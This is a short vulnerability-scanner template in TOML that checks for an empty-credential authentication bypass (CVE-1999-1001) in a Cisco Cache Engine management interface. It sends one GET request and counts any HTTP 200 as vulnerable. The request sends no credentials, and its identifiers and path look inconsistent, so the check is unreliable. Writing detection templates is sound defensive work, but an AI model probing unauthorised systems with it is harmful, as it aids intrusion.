[info]
author = "ave"
description = "思科缓存引擎管理接口存在认证缺陷，允许远程攻击者使用空用户名和空密码直接登录。本 PoC 通过向管理接口发送不含有效凭据的 HTTP 请求，检测是否可绕过认证获得非授权访问。"
id = "POC-AVE-1999-0837"
name = "CVE-1999-1001 Cisco Cache Engine 空凭据认证绕过 PoC"
severity = "low"
tags = ["ave-1999-0837"]
vuln_id = [
    "CVE-1999-1001",
    "AVE-1999-0837",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
